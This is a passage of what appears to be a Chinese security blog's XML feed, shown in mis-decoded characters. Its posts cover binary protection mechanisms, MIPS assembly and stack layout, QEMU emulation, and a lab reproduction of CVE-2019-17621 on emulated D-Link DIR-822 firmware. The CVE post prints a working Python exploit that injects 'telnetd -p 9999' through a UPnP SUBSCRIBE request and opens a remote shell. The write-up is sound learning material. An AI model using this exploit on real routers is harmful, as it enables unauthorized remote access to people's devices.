      <tag>afl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¨‹åºä¿æŠ¤æœºåˆ¶</title>
    <link href="/2023/03/14/ctf-pwn/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <url>/2023/03/14/ctf-pwn/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>æ ˆä¸å¯æ‰§è¡Œ no execute</p><p>åŒDEPï¼Œæ•°æ®æ‰§è¡Œä¿æŠ¤ã€‚</p><h2 id="Stack-Canary"><a href="#Stack-Canary" class="headerlink" title="Stack Canary"></a>Stack Canary</h2><p>æ ˆä¸­åŠ ä¸€ä¸ªéšæœºæ•°ï¼Œåœ¨å‡½æ•°æ‰§è¡Œå®Œè¿”å›ä¹‹å‰ï¼Œæ£€æŸ¥è¿™ä¸ªéšæœºæ•°æ˜¯å¦æ”¹å˜æ¥åˆ¤æ–­æ˜¯å¦æ ˆæº¢å‡º</p><h2 id="PIEä¸ASLR"><a href="#PIEä¸ASLR" class="headerlink" title="PIEä¸ASLR"></a>PIEä¸ASLR</h2><p>ASLRéšæœºå †ã€æ ˆã€mmapçš„åœ°å€</p><p>PIEéšæœºæ•°æ®æ®µã€ä»£ç æ®µçš„åœ°å€</p><h2 id="Relro"><a href="#Relro" class="headerlink" title="Relro"></a>Relro</h2><p>relocation read-only é‡å®šå‘åªè¯»</p><p>å¼€å¯ä¹‹ågotè¡¨ä¸å¯å†™</p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mipsçš„å †æ ˆ</title>
    <link href="/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E5%A0%86%E6%A0%88/"/>
    <url>/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E5%A0%86%E6%A0%88/</url>
    
    <content type="html"><![CDATA[<h4 id="MIPSçš„æ ˆğŸ’£"><a href="#MIPSçš„æ ˆğŸ’£" class="headerlink" title="MIPSçš„æ ˆğŸ’£"></a>MIPSçš„æ ˆğŸ’£</h4><ol><li><p>æ ˆå¢é•¿æ–¹å‘ï¼šåŒx86ï¼Œå‘ä½åœ°å€å¢é•¿</p></li><li><p>æ²¡æœ‰EBPæŒ‡é’ˆï¼ˆä½†æ˜¯æœ‰ä¸€ä¸ªfpï¼Œè§MIPSæ±‡ç¼–è¿™ç¯‡æ–‡ç« ï¼‰</p></li><li><p>ä¼ å‚ï¼šå‰å››ä¸ªå‚æ•°é€šè¿‡$a0~$a3ä¼ é€’ï¼Œå¤šå‡ºçš„å‚æ•°æ”¾å…¥æ ˆç©ºé—´</p></li><li><p>è¿”å›å€¼ï¼š$RAå¯„å­˜å™¨ </p></li></ol><h4 id="mipsä¸x86å‡½æ•°è°ƒç”¨åŒºåˆ«"><a href="#mipsä¸x86å‡½æ•°è°ƒç”¨åŒºåˆ«" class="headerlink" title="mipsä¸x86å‡½æ•°è°ƒç”¨åŒºåˆ«"></a>mipsä¸x86å‡½æ•°è°ƒç”¨åŒºåˆ«</h4><ol><li>å°†$PCå¯„å­˜å™¨ç§»åˆ°$RAå¯„å­˜å™¨</li><li>å¦‚æœè¢«è°ƒç”¨çš„å‡½æ•°æ˜¯å¦‚æœæ˜¯éå¶å‡½æ•°ï¼ˆè°ƒç”¨å…¶ä»–å‡½æ•°ï¼‰ï¼Œå°†$RAå­˜åœ¨æ ˆï¼›å¶å‡½æ•°åˆ™ä¸å˜</li><li>å‡½æ•°è¿”å›æ—¶ï¼Œå¶å‡½æ•°ç›´æ¥ <code>jr $RA</code>ï¼Œéå¶å‡½æ•°å…ˆæŠŠè¿”å›åœ°å€å­˜å…¥$RAå†è·³è½¬</li></ol><p>ã€Šå®¶ç”¨è·¯ç”±å™¨0dayæ¼æ´æŒ–æ˜ã€‹è¿™æœ¬ä¹¦ä¸Šçš„å›¾ä¾‹ï¼š</p><p><img src="/img/mips/1.jpg"></p><h4 id="ä¸»è°ƒå‡½æ•°å¹²çš„äº‹"><a href="#ä¸»è°ƒå‡½æ•°å¹²çš„äº‹" class="headerlink" title="ä¸»è°ƒå‡½æ•°å¹²çš„äº‹"></a>ä¸»è°ƒå‡½æ•°å¹²çš„äº‹</h4><h5 id="æ¼”ç¤º"><a href="#æ¼”ç¤º" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h5><ol><li><p>åˆ›å»º <code>more argument.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//more argument.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">more_arg</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> c,<span class="hljs-type">int</span> d,<span class="hljs-type">int</span> e)</span><br>&#123;<br>    <span class="hljs-type">char</span> dst[<span class="hljs-number">100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">sprintf</span>(dst,<span class="hljs-string">&quot;%d%d%d%d%d\n&quot;</span>,a,b,c,d,e);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a1=<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> a2=<span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> a3=<span class="hljs-number">3</span>;<br>    <span class="hljs-type">int</span> a4=<span class="hljs-number">4</span>;<br>    <span class="hljs-type">int</span> a5=<span class="hljs-number">5</span>;<br>    more_arg(a1,a2,a3,a4,a5);<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>ç¼–è¯‘</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">mips-linux-gnu-gcc ./<span class="hljs-built_in">more</span>\ argument.c  -o   <span class="hljs-built_in">more</span>\ argument<br></code></pre></td></tr></table></figure></li><li><p>idaæ‰“å¼€</p><p>é¦–å…ˆå¯ä»¥çœ‹åˆ°å‰å››ä¸ªå‚æ•°å­˜å…¥äº†$a0~$a3</p><p><img src="/img/mips/2.jpg"></p><p>ç„¶åå‰é¢5ä¸ªï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">li      $v0, ?<br>sw      $v0, 0x??+var_18($fp)<br></code></pre></td></tr></table></figure><p>æ˜¯èµ‹å€¼æ“ä½œï¼Œå› æ­¤ä¸­é—´çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lw      $v0, 0x38+var_8($fp)<br>sw      $v0, 0x38+var_28($sp)<br></code></pre></td></tr></table></figure><p>å³ä¸ºç¬¬äº”ä¸ªå‚æ•°çš„ä¼ é€’</p></li></ol><h4 id="è¢«è°ƒå‡½æ•°å¹²çš„äº‹"><a href="#è¢«è°ƒå‡½æ•°å¹²çš„äº‹" class="headerlink" title="è¢«è°ƒå‡½æ•°å¹²çš„äº‹"></a>è¢«è°ƒå‡½æ•°å¹²çš„äº‹</h4><p>è¢«è°ƒç”¨å‡½æ•°çš„å¼€å¤´å¹²äº†ä»¥ä¸‹å‡ ä»¶äº‹ï¼ˆä»…é’ˆå¯¹éå¶å‡½æ•°ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">addiu   $sp, -0x40<br>sw      $ra, 0x38+var_s4($sp)<br>sw      $fp, 0x38+var_s0($sp)<br>move    $fp, $sp<br></code></pre></td></tr></table></figure><p>é¦–å…ˆï¼ŒæŠ¬é«˜sp 0x40ä¸ªå­—èŠ‚<em><strong>ï¼ˆè¿™é‡Œ0x40æ˜¯éšä¾¿å†™çš„ï¼‰</strong></em>ã€‚ç„¶åå°†raæ”¾åˆ°<code>sp + 0x38 + 4</code>ï¼Œfpæ”¾åˆ°<code>sp + 0x38 + 0</code>çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯è¢«è°ƒå‡½æ•°çš„æ ˆåº•ä¸ºraï¼Œç„¶åæ˜¯fpã€‚æœ€åå°†fpèµ‹å€¼ä¸ºspã€‚</p><p>ç„¶åéœ€è¦å¯¹å‚æ•°è¿›è¡Œå¤„ç†ï¼Œarg_0 åˆ°arg_Cæ˜¯ä¸»è°ƒå‡½æ•°é¢„ç•™å‡ºæ¥çš„ç©ºé—´ï¼Œéœ€è¦è¢«è°ƒå‡½æ•°å†æŠŠ$a0-$a3å­˜å…¥è¿›å»ï¼Œç„¶åarg_10æœ¬èº«ä¸»è°ƒå‡½æ•°å°±å·²ç»å­˜å¥½äº†ç¬¬äº”ä¸ªå‚æ•°ï¼Œä¸éœ€è¦åŠ¨ã€‚</p><p><img src="/img/mips/3.jpg"></p><p>æœ€ç»ˆä¸»è°ƒå’Œè¢«è°ƒå‡½æ•°çš„æ ˆé•¿è¿™æ ·ï¼š</p><p><img src="/img/mips/4.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>mipsæ±‡ç¼–</category>
      
    </categories>
    
    
    <tags>
      
      <tag>assembly</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mipæ±‡ç¼–</title>
    <link href="/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E6%B1%87%E7%BC%96/"/>
    <url>/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E6%B1%87%E7%BC%96/</url>
    
    <content type="html"><![CDATA[<h2 id="MIPSæ±‡ç¼–"><a href="#MIPSæ±‡ç¼–" class="headerlink" title="MIPSæ±‡ç¼–"></a>MIPSæ±‡ç¼–</h2><ol><li><p>å¯„å­˜å™¨</p><p>32ä¸ªï¼Œ$0 ~ $31ï¼Œæ¯ä¸ªå¯„å­˜å™¨å…·ä½“ä½œç”¨è§ <a href="https://ctf-wiki.org/assembly/mips/readme/">https://ctf-wiki.org/assembly/mips/readme/</a></p><p>å¸¸è§çš„åŒ…æ‹¬ï¼š</p></li></ol><table><thead><tr><th align="center">å¯„å­˜å™¨</th><th align="center">ä½œç”¨</th></tr></thead><tbody><tr><td align="center">$0</td><td align="center">æ’å®šä¸º0</td></tr><tr><td align="center">$4 - $7</td><td align="center">å‡½æ•°å‚æ•°ï¼Œé€šå¸¸ä¹Ÿå«$a0 - $a3</td></tr><tr><td align="center">$29</td><td align="center">$spï¼Œæ ˆé¡¶</td></tr><tr><td align="center">$30</td><td align="center">$fpï¼Œæ ˆå¸§</td></tr><tr><td align="center">$31</td><td align="center">$raï¼Œè¿”å›åœ°å€</td></tr></tbody></table><p>é™¤äº†è¿™32ä¸ªå¯„å‡ºå™¨ï¼Œè¿˜æœ‰$PCå’Œ HIã€LO</p><ol start="2"><li><p>æŒ‡ä»¤</p><p>MIPSæŒ‡ä»¤ä¸ºload-storeæ¶æ„ï¼Œæ“ä½œæ•°å¿…é¡»å…ˆä»å†…å­˜ä¸­è¯»å–åˆ°å¯„å­˜å™¨é‡Œæ‰èƒ½è¿ç®—ï¼Œ<strong>ä¸èƒ½ç›´æ¥æ“ä½œå†…å­˜</strong></p><table><thead><tr><th align="center">æŒ‡ä»¤</th><th align="center">å†…å®¹</th></tr></thead><tbody><tr><td align="center">beq</td><td align="center">branch on equal</td></tr><tr><td align="center">bgez</td><td align="center">branch on greater than or euqal to zero ï¼ˆâ‰¥0è·³è½¬ï¼‰</td></tr><tr><td align="center">bgezal</td><td align="center">ï¼ˆal = and linkï¼‰  $raè®¾ç½®ä¸ºä¸‹ä¸€æ¡æŒ‡ä»¤ç„¶åè·³è½¬ï¼Œç›¸å½“äºè·³è½¬åˆ°ä¸€ä¸ªå‡½æ•°</td></tr><tr><td align="center">bgtz</td><td align="center">branch on greater than zero ï¼ˆï¼0è·³è½¬ï¼‰</td></tr><tr><td align="center">bne</td><td align="center">branch on not equal</td></tr><tr><td align="center">jal</td><td align="center">jump and link è¿‡ç¨‹è°ƒç”¨ï¼Œä¼šå°†$raè®¾ç½®ä¸ºä¸‹ä¸€æ¡æŒ‡ä»¤</td></tr></tbody></table><p>è¿ç®—ï¼šä¹˜æ³•ä¼šå°†ç»“æœé«˜32ä½å­˜å…¥HIï¼Œä½32ä½å­˜å…¥LO</p><p>â€‹            é™¤æ³•ä¼šå°†ä½™æ•°å­˜å…¥HIï¼Œå•†å­˜å…¥LO</p><p>ä¸‰ä¸ªæ“ä½œæ•°ï¼Œéƒ½æ˜¯å°†å³è¾¹ä¸¤ä¸ªçš„è®¡ç®—å­˜å…¥å·¦è¾¹çš„ï¼Œä¾‹å¦‚ or $d,$s,$t ï¼Œd = s | t</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>mipsæ±‡ç¼–</category>
      
    </categories>
    
    
    <tags>
      
      <tag>assembly</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>qemuçš„å®‰è£…ä¸ä»¿çœŸç¬¬ä¸€ä¸ªmipsç¨‹åº</title>
    <link href="/2022/12/23/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/%E5%A6%82%E4%BD%95%E7%94%A8qemu%E4%BB%BF%E7%9C%9Fmips%E7%A8%8B%E5%BA%8F/"/>
    <url>/2022/12/23/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/%E5%A6%82%E4%BD%95%E7%94%A8qemu%E4%BB%BF%E7%9C%9Fmips%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h4 id="QEMUå®‰è£…"><a href="#QEMUå®‰è£…" class="headerlink" title="QEMUå®‰è£…"></a>QEMUå®‰è£…</h4><p>QEMUä»¿çœŸç¨‹åºåˆ†ä¸ºä¸¤ç±»ï¼šä½¿ç”¨è€…æ¨¡å¼ï¼ˆUser Modeï¼‰ã€ç³»ç»Ÿæ¨¡å¼ï¼ˆSystem Modeï¼‰ã€‚åŒºåˆ«åœ¨äºUser Modeåªä»¿çœŸå•ä¸ªç¨‹åºï¼Œè€ŒSystem Modeä»¿çœŸæ•´ä¸ªè®¡ç®—æœºç³»ç»Ÿï¼Œç±»ä¼¼vmware</p><h5 id="ä½¿ç”¨è€…æ¨¡å¼"><a href="#ä½¿ç”¨è€…æ¨¡å¼" class="headerlink" title="ä½¿ç”¨è€…æ¨¡å¼"></a>ä½¿ç”¨è€…æ¨¡å¼</h5><p>å®‰è£…ï¼š<code>sudo apt-get install qemu-user[-static]</code></p><p>ä½¿ç”¨ï¼ˆä»¥mipsä¸ºä¾‹ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd &lt;path-to-fsroot&gt;<br>cp $(which qemu-mipsel-static) ./<br>sudo chroot . ./qemu-mipsel-static &lt;path-to-elf&gt;<br></code></pre></td></tr></table></figure><p>å¯¹äº32ä½å°ç«¯åºï¼ˆLSBï¼‰ç¨‹åºï¼Œä½¿ç”¨<code>qemu-mipsel</code>æ¥ä»¿çœŸï¼Œ32ä½MSBç¨‹åºï¼Œä½¿ç”¨<code>qemu-mips</code>æ¥ä»¿çœŸ</p><p>ä¸€ä¸ªå°ç«¯åºçš„ä»¿çœŸç¤ºä¾‹ï¼š</p><p><img src="/img/qemu/1.jpg"></p><blockquote><p>Q1ï¼šä¸ºä»€ä¹ˆè¦åŠ  -static ï¼Ÿ</p><p>A1ï¼šxxx-staticè¡¨ç¤ºä½¿ç”¨é™æ€é“¾æ¥çš„qemuç¨‹åºï¼Œä¸ä¾èµ–å¤–éƒ¨åŠ¨æ€é“¾æ¥ç¨‹åºï¼Œç”±äºä½¿ç”¨æ˜¯è¦chrootæ”¹å˜æ ¹ç›®å½•ï¼ŒåŸæœ¬çš„åŠ¨æ€é“¾æ¥åº“ä¼šæ— æ³•æ‰¾åˆ°ï¼Œé™¤éä½¿ç”¨lddå‘½ä»¤æŠŠæ‰€æœ‰ä¾èµ–å…¨éƒ½å¤åˆ¶åˆ°æ–°çš„æ ¹ç›®å½•ä¸‹ï¼Œå¦åˆ™æ— æ³•è¿è¡Œã€‚</p><p>è€Œä¸”çœŸçš„å¤åˆ¶åŠ¨æ€é“¾æ¥åº“è¿‡æ¥å¯èƒ½ä¼šå’ŒåŸæœ¬å­˜åœ¨çš„æ–‡ä»¶é‡åï¼ˆæˆ‘çŒœçš„ï¼Œæ²¡éªŒè¯è¿‡ğŸ˜…ï¼‰</p></blockquote><h5 id="ç³»ç»Ÿæ¨¡å¼"><a href="#ç³»ç»Ÿæ¨¡å¼" class="headerlink" title="ç³»ç»Ÿæ¨¡å¼"></a>ç³»ç»Ÿæ¨¡å¼</h5><p>ä¸ç®¡äº†ï¼Œç›´æ¥ç”¨fapæˆ–è€…firmae</p>]]></content>
    
    
    <categories>
      
      <category>å›ºä»¶ä»¿çœŸ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>firmware analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-17621 dlink-822 å‘½ä»¤æ³¨å…¥æ¼æ´å¤ç°</title>
    <link href="/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/"/>
    <url>/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/</url>
    
    <content type="html"><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>ç¬¬ä¸€æ¬¡æˆåŠŸä»¿çœŸä¸€ä¸ªå›ºä»¶å¹¶æˆåŠŸè®¿é—®webå¹¶æˆåŠŸå¤ç°æ¼æ´çš„exp â€¦â€¦</p><p>æœŸé—´ç”¨ firmware-analysis-toolkit å’Œ firmware-analysis-plus ï¼ˆåŒ…æ‹¬å®ƒçš„dockerï¼‰åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿï¼ˆkali2020.4ï¼Œkali2022.4ï¼‰ä¸Šæ¥å›å®éªŒäº†å„ç§å„æ ·çš„å›ºä»¶ï¼Œæœ€ç»ˆçš„æˆåŠŸç›®å‰çœ‹æ¥åªæ˜¯ä¸€ä¸ªå¶ç„¶ï¼ˆå› ä¸ºé‡åˆ°äº†å¤ªå¤šæˆ‘ç›®å‰æ— æ³•è§£é‡Šçš„é—®é¢˜ï¼‰ç‰¹æ­¤è®°å½•ä¸€ä¸‹ğŸ˜ª</p><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><p>kali2020.4 ï¼ˆåŒæ ·çš„å›ºä»¶ï¼ŒåŒæ ·ç‰ˆæœ¬çš„fapï¼Œä½†æ˜¯åœ¨kali2022.4ä¸Šè¿è¡Œè¿™ä¸ªå›ºä»¶æ—¶ï¼Œä¼šInternal Error 500ï¼ˆä½†èµ·ç èƒ½è®¿é—®åˆ°è¿™ä¸ªipâ€¦â€¦ğŸ˜…ï¼‰</p><p>å›ºä»¶ä¸‹è½½åœ°å€ï¼š<a href="http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822">http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822</a></p><p>å°±è¿™ä¸€ä¸ªç‰ˆæœ¬1.03B03</p><p><img src="/img/CVE-2019-17621/1.jpg"></p><p>fapä½¿ç”¨çš„æ˜¯2.3ç‰ˆæœ¬ <a href="https://github.com/liyansong2018/firmware-analysis-plus/tree/v2.3">https://github.com/liyansong2018/firmware-analysis-plus/tree/v2.3</a></p><p>ä½¿ç”¨çš„expæ¥æº <a href="https://www.jianshu.com/p/409106be87b7">https://www.jianshu.com/p/409106be87b7</a></p><h4 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h4><p><img src="/img/CVE-2019-17621/2.jpg"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment"># Exploit By Miguel Mendez &amp; Pablo Pollanco</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">httpSUB</span>(<span class="hljs-params">server, port, shell_file</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n[*] Connection &#123;host&#125;:&#123;port&#125;&#x27;</span>).<span class="hljs-built_in">format</span>(host=server, port=port)<br>    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    request = <span class="hljs-string">&quot;SUBSCRIBE /gena.cgi?service=&quot;</span> + <span class="hljs-built_in">str</span>(shell_file) + <span class="hljs-string">&quot; HTTP/1.0\n&quot;</span><br>    request += <span class="hljs-string">&quot;Host: &quot;</span> + <span class="hljs-built_in">str</span>(server) + <span class="hljs-built_in">str</span>(port) + <span class="hljs-string">&quot;\n&quot;</span><br>    request += <span class="hljs-string">&quot;Callback: &lt;http://192.168.0.4:34033/ServiceProxy27&gt;\n&quot;</span><br>    request += <span class="hljs-string">&quot;NT: upnp:event\n&quot;</span><br>    request += <span class="hljs-string">&quot;Timeout: Second-1800\n&quot;</span><br>    request += <span class="hljs-string">&quot;Accept-Encoding: gzip, deflate\n&quot;</span><br>    request += <span class="hljs-string">&quot;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n&quot;</span><br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Sending Payload&#x27;</span>)<br>    con.connect((socket.gethostbyname(server),port))<br>    con.send(request.encode())<br>    results = con.recv(<span class="hljs-number">4096</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Running Telnetd Service&#x27;</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Opening Telnet Connection\n&#x27;</span>)<br>    sleep(<span class="hljs-number">2</span>)<br>    os.system(<span class="hljs-string">&#x27;telnet &#x27;</span> + <span class="hljs-built_in">str</span>(server) + <span class="hljs-string">&#x27; 9999&#x27;</span>)<br>serverInput = raw_input(<span class="hljs-string">&#x27;IP Router: &#x27;</span>)<br>portInput = <span class="hljs-number">49152</span><br>httpSUB(serverInput, portInput, <span class="hljs-string">&#x27;`telnetd -p 9999 &amp;`&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="å‘"><a href="#å‘" class="headerlink" title="å‘"></a>å‘</h4><p>è¿™æ˜¯ç¬¬ä¸€æ¬¡ä»¿çœŸå›ºä»¶ï¼Œä¸€å¼€å§‹ç”¨çš„æ˜¯firmware-analysis-toolkitï¼ˆfatï¼Œ<a href="https://github.com/attify/firmware-analysis-toolkit">https://github.com/attify/firmware-analysis-toolkit</a>ï¼‰ï¼Œé¦–å…ˆå®ƒå®‰è£…çš„æ—¶å€™å°±ä¸€å †é—®é¢˜ã€‚åŒ…æ‹¬å®ƒçš„setup.shé‡Œï¼Œè¦å®‰è£…ä¸ªlsb-coreï¼Œä½†æ˜¯aptæ‰¾ä¸åˆ°è¿™ä¸ªåŒ…ï¼Œä¸Šç½‘æ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ°ä¸€ä¸ªèƒ½æˆåŠŸå®‰è£…çš„ï¼Œç„¶ååœ¨ä»–çš„issueé‡Œå‘ç°æœ‰äººè¯´è¿™ä¸ªä¸æ˜¯å¿…è¦çš„ï¼Œå¯ä»¥åˆ æ‰ğŸ˜…ï¼Œç„¶åsetp.shé‡Œè¿˜æœ‰ä¸ªqt5base-devçš„åŒ…ï¼Œåœ¨kaliä¸Šå®é™…åº”è¯¥æ˜¯qtbase5-devğŸ˜…ï¼Œæˆ‘ä¸çŸ¥é“å…¶ä»–ç³»ç»Ÿæ˜¯å•¥æ ·ï¼Œè¿˜æœ‰ä¸€ä¸ªå‘æ˜¯å› ä¸ºgit  cloneä¸ç¨³å®šï¼Œæˆ‘æ‰‹åŠ¨ä¸‹è½½çš„zipåŒ…ï¼Œä½†å®é™…ä¸Šè¿™ä¸ªcloneæ˜¯è¦recursiveçš„ğŸ˜…ï¼Œç›´æ¥è¿è¡Œfat.pyä»–æ˜¯ç”¨pexpectå»å¼€å¯å¦ä¸€ä¸ªè¿›ç¨‹ï¼Œç„¶åæ–°å¯åŠ¨çš„è¿™ä¸ªè¿›ç¨‹å¹¶ä¸ä¼šæŠŠè¾“å‡ºæ˜¾ç¤ºè¿‡æ¥ï¼Œçœ‹æºç è°ƒè¯•åŠå¤©æ‰å‘ç°æ˜¯å°‘æ–‡ä»¶ï¼Œå½“æ—¶è¿˜å¾ˆçº³é—·ğŸ˜…ä¸ºå•¥ä¼šå°‘ï¼ˆè¿‡äºncï¼‰</p><p>ç›¸å¯¹æ¥è¯´firmware-analysis-plusï¼ˆfapï¼Œ<a href="https://github.com/liyansong2018/firmware-analysis-plus">https://github.com/liyansong2018/firmware-analysis-plus</a>ï¼‰æ¯”è¾ƒå‹å¥½ï¼ˆå’ŒfatåŸºæœ¬ä¸€æ ·ï¼Œåªä¸è¿‡ç»†èŠ‚ä¸Šåšäº†ä¸€äº›ä¿®æ”¹ï¼‰ï¼Œé¦–å…ˆï¼Œå…¶ä»–é¡¹ç›®çš„æ–‡ä»¶ç»Ÿä¸€æ”¾åœ¨äº†åº“é‡Œï¼ˆæ²¡æœ‰é‚£ä¸ªé€’å½’äº†ğŸ˜…ï¼‰ç„¶åè¿˜åšäº†ä¸€ä¸ªdockerï¼Œä½†æ˜¯è¿™ä¸ªdockeræ²¡æœ‰è£…jeffersonï¼Œä»¿çœŸä¸äº†jffsçš„æ–‡ä»¶ç³»ç»Ÿï¼Œåªèƒ½ç»§ç»­è‡ªå·±é…ç¯å¢ƒğŸ˜…ã€‚fat.pyåé¢è¦åŠ ä¸€ä¸ª-q qemu-pathçš„å‚æ•°ï¼Œå¦åˆ™network  interfaceåˆ—è¡¨ä¼šä¸ºç©ºï¼ˆncå¦‚æˆ‘è¿˜è·‘å»äººå®¶issueåº•ä¸‹é—®ï¼Œè¿˜å¥½äººå®¶æ²¡è¿‡å‡ åˆ†é’Ÿå°±å›å¤äº†ğŸ˜…ï¼‰</p><p>ç„¶åexpéƒ¨åˆ†ä¸€å¼€å§‹æˆ‘ç”¨çš„è¿™ä¸ªå¸–å­çš„exp ï¼š<a href="http://www.manongzj.com/blog/28-tkbcqqitdf.html">http://www.manongzj.com/blog/28-tkbcqqitdf.html</a>ï¼Œè·‘ä¸é€šï¼Œåæ¥æ¢æˆäº†å‰æ–‡ç”¨çš„expï¼Œå±…ç„¶å¥½ä½¿äº†ã€‚ã€‚ã€‚æˆ‘æ²¡çœ‹å‡ºæ¥è¿™ä¿©expæœ‰å•¥åŒºåˆ«ï¼Œä¸æƒ³ç®¡äº†ğŸ˜…ï¼Œç¬¬ä¸€æ¬¡å›ºä»¶ä»¿çœŸåˆ°æ­¤ç»“æŸï¼Œæ¼æ´æ˜¯å•¥åŸç†æš‚æ—¶ä¸æƒ³ç®¡äº†</p>]]></content>
    
    
    <categories>
      
      <category>å›ºä»¶ä»¿çœŸ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>firmware analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>èœé¸¡çš„2022dataconè®°å½•</title>
    <link href="/2022/12/11/%E6%9D%82%E9%A1%B9/%E8%8F%9C%E9%B8%A1%E7%9A%842022datacon/"/>
    <url>/2022/12/11/%E6%9D%82%E9%A1%B9/%E8%8F%9C%E9%B8%A1%E7%9A%842022datacon/</url>
    
